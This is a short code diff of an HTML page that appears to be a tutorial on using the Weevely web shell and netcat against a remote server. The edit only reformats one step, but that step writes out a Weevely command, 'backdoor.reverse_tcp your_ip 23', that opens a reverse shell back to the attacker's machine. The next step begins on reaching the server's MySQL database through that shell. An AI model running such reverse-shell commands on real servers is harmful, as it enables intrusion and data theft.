@@ -103,7 +103,7 @@ require_once 'u.php';
     </fieldset>
     <fieldset>
         <label>Step 2f.</label>Back to Weevely terminal opened in <b>step 2D</b>, after NetCat successfully listening on specific port, now  make a reverse TCP connection to our computer. 
-        <code>backdoor.reverse_tcp your_ip 23</code>
+       <p><b>Type:</b> <code>backdoor.reverse_tcp your_ip 23</code></p>
     </fieldset>
     <fieldset>
         <label>Step 2g.</label>If remote  server is a web server with MySQL database and PHPMyadmin installed.Try this in your 'netcat' terminal opened in <b>step 2E</b>
